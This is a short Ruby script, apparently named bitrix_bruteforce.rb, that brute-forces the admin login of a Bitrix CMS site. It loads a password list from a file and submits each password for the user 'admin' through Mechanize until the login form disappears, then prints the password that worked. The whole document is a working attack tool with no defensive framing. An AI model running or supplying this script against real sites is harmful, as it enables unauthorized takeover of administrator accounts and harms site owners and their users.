#!/usr/bin/env ruby

require 'mechanize'
require 'progress_bar'

passes = []
File.open("./passes.txt", "r") do |f|
  while line = f.gets
    passes << line.chomp.chomp
  end
end

# let's try to parse!
begin
  agent = Mechanize.new
  agent.get(ARGV.first)
rescue ArgumentError, SocketError => e
  puts "Something wrong, use right url!"
  puts "Usage: ./bitrix_bruteforce.rb http://example.com/path/to/admin/panel"
  exit
end

# progress bar initialization
bar = ProgressBar.new(passes.length)

passes.each_with_index do |pass, index|
  bar.increment!
  form = agent.page.forms.first
  form.USER_LOGIN = "admin"
  form.USER_PASSWORD = pass
  form.submit
  if agent.page.forms.count != 1
    puts pass
    exit
  end
end